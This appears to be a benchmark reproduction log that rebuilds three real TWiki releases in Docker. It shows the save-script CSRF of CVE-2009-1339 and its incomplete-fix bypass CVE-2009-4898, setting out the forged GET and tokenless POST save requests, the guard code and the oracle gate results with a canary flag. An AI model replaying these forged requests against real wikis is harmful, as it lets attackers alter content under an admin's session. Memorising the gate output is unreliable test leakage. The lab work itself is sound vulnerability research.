twiki-cve-2009-4898 — reproduction log  (REAL-APP REBUILD, 2026-07-16)
======================================================================

Pair: CVE-2009-1339 (original) -> CVE-2009-4898 (incomplete-fix bypass)
Product: TWiki (Perl/CGI enterprise wiki). Root cause: CSRF (CWE-352).
Sink: the real `save` script (bin/save -> lib/TWiki/UI/Save.pm). Variant A (same sink).

WHAT CHANGED FROM THE PRIOR BUILD (banned lift -> real app)
-----------------------------------------------------------
The previous build LIFTED TWiki's three version-gated save-CSRF predicates VERBATIM
into a Perl harness (app.pl) that was NOT the real TWiki. That is banned by the HARD
POLICY. This build boots the REAL published TWiki per version and lets TWiki's OWN
guard run, triggered by an EXTERNAL HTTP forged /bin/save. The stale lift files are
left in-tree, unused (see STALE FILES).

RELATIONSHIP (authoritative)
----------------------------
NVD CVE-2009-4898: "Cross-site request forgery (CSRF) ... in TWiki before 4.3.2 ...
as demonstrated by a URL for a save script in the ACTION attribute of a FORM element,
in conjunction with a call to the submit method in the onload attribute of a BODY
element. NOTE: this issue exists because of an insufficient fix for CVE-2009-1339."
-> genuine incomplete-fix lineage, same sink (save), distinct releases: CVE-2009-1339
fixed in TWiki 4.3.1, CVE-2009-4898 fixed in 4.3.2 (SecurityAuditTokenBasedCsrfFix).

REAL VERSIONS (tarballs fetched at BUILD time; nothing but text committed here)
-------------------------------------------------------------------------------
V0 = TWiki-4.3.0.tgz  (5,875,615 bytes, 2009-03-30) SourceForge archive.
     lib/TWiki/UI/Save.pm::buildNewTopic has NO method/token guard -> forged GET save works.
V1 = TWiki-4.3.1.tgz  (5,888,363 bytes, 2009-04-29). CVE-2009-1339 fix -- Save.pm adds:
         my $reqmethod = $query->request_method();
         if( $reqmethod !~ /^POST$/i ) { throw ... def => 'post_method_only' ... }
     GET save -> BLOCKED (post_method_only). POST save -> accepted, NO token check.
     <== the CVE-2009-4898 RESIDUAL: a cross-site auto-submitting POST form forges the save.
V2 = TWiki-4.3.2.tgz  (6,033,310 bytes, 2009-09-02). CVE-2009-4898 fix -- Save.pm adds,
     after the POST check:
         if ( $TWiki::cfg{CryptToken}{Enable} && $secureActions{ lc('save') } ) {
             TWiki::UI::verifyCryptToken( $session, $query->param('crypttoken') );
         }
     TWiki.spec ships {CryptToken}{Enable}=1 and SecureActions='register,save,...', so a
     stock 4.3.2 requires a valid one-time crypttoken (minted by createCryptToken=MD5(rand)
     in LoginManager.pm, embedded into the victim's same-origin edit form by
     addCryptTokeninForm, one-time use via cleanCryptToken; verified in UI.pm against the
     victim's CGI::Session store). Tokenless forged POST -> BLOCKED (invalidtoken).

REAL RUNTIME (Dockerfile / docker-compose.yml / entrypoint.sh)
--------------------------------------------------------------
Base debian:bookworm-slim + apache2 (mpm_prefork + mod_cgi) + Perl 5.36 + libcgi-pm-perl,
liberror-perl, libcgi-session-perl, libunicode-string-perl. The real TWiki bin/ + lib/
tree is extracted from the fetched tarball; LocalSite.cfg sets RcsLite store (pure Perl,
no rcs binaries), TemplateLogin + client sessions (TWIKISID cookie), HtPasswd auth.
Apache serves bin/ as CGI at /bin, pub/ at /pub. TWIKI_VER build-arg selects the release
per compose profile (v0=4.3.0, v1=4.3.1, v2=4.3.2), ports 39600/39601/39602.

COMPAT PATCH (security-neutral; the CSRF guard is NOT touched)
-------------------------------------------------------------
TWiki 4.3.x (2009) uses `foreach $x qw(...)` (list-without-parens) and `defined @array`,
both fatal on modern Perl (>=5.22). No pullable base image ships a Perl old enough
(perl:5.20 and older are v1-manifest images Docker 29 refuses). So at build time we apply
a pure syntax rewrite only:
  * wrap `foreach [my] $x qw(...)` -> `foreach [my] $x (qw(...))`
    (regex: s/((?:for|foreach)\s+(?:my\s+)?\$\w+\s+)(qw\([^)]*\))/$1($2)/gs)
  * setlib.cfg: `... if defined @localPerlLibPath` -> `... if @localPerlLibPath`
The save-CSRF predicates (Save.pm post_method_only method check; Save.pm CryptToken gate;
UI.pm verifyCryptToken) are byte-for-byte identical to the shipped source.

CANARY (benign CSRF, over real HTTP)
------------------------------------
${PCB_FLAG} is written by the entrypoint into the admin-only topic Main.PcbSecret
(`Set ALLOWTOPICVIEW = TWikiAdminGroup`). Only TWikiAdminGroup may view it (guest gets
no flag -- confirmed). The victim is an authenticated admin (AdminUser, in TWikiAdminGroup).
A guard-passing forged /bin/save writes %INCLUDE{"Main.PcbSecret"}% into a fresh Sandbox
topic; the victim admin's own rendered view of that topic INCLUDEs the admin-only secret,
surfacing the flag. A blocked save never writes the topic, so the flag never appears.
No TWiki application/business code is instrumented to place the flag.

THE REAL FORGED-SAVE REQUESTS (external HTTP)
---------------------------------------------
Victim login (both):
  POST /bin/login   username=AdminUser&password=S3cretAdminPass   -> Set-Cookie: TWIKISID=...
Original seed (CVE-2009-1339, forged GET):
  GET  /bin/save/Sandbox/PcbProbe<rand>?text=%25INCLUDE%7B%22Main.PcbSecret%22%7D%25
       Cookie: TWIKISID=<victim>      (no crypttoken)
    V0 -> 302 to view, topic written, flag surfaced.
    V1 -> 302 to /bin/oops/...;def=post_method_only  (topic NOT written, no flag).
Residual (CVE-2009-4898, tokenless forged POST):
  POST /bin/save/Sandbox/PcbProbe<rand>
       Cookie: TWIKISID=<victim>
       body: text=%INCLUDE{"Main.PcbSecret"}%   (NO crypttoken)
    V1 -> 302 to view, topic written, flag surfaced (RESIDUAL open).
    V2 -> save blocked by verifyCryptToken (invalidtoken), topic NOT written, no flag.

GATE (Variant A) — REAL DOCKER, `python3 oracle.py --run-gate`
--------------------------------------------------------------
{
  "original_poc_reaches_flag_on_v0": true,   # forged GET save reveals flag on V0
  "original_poc_blocked_on_v1": true,        # GET save -> post_method_only on V1
  "bypass_poc_reaches_flag_on_v1": true,     # tokenless forged POST reveals flag on V1
  "passed": true,
  "_residual_blocked_on_v2": true,           # tokenless POST -> invalidtoken on V2
  "_seed_blocked_on_v2": true,
  "_env_ready": { "v0": true, "v1": true, "v2": true },
  "_flag": "PCBFLAG_4ba202f4b226ed432bfe163fc736cd97"
}

Images: debian:bookworm-slim base, 3x ~242MB (v0/v1/v2). Teardown: docker compose
down -v --rmi all + docker image prune -f (project-scoped).

Data quality: CVE-2009-1339 (fixed 4.3.1) is the exact guard CVE-2009-4898 (fixed 4.3.2)
bypasses; distinct releases (4.3.1 vs 4.3.2), same sink (save), both gate preconditions
satisfiable on the real app. Not a same-fix / V1==V0 / original==residual degenerate case.

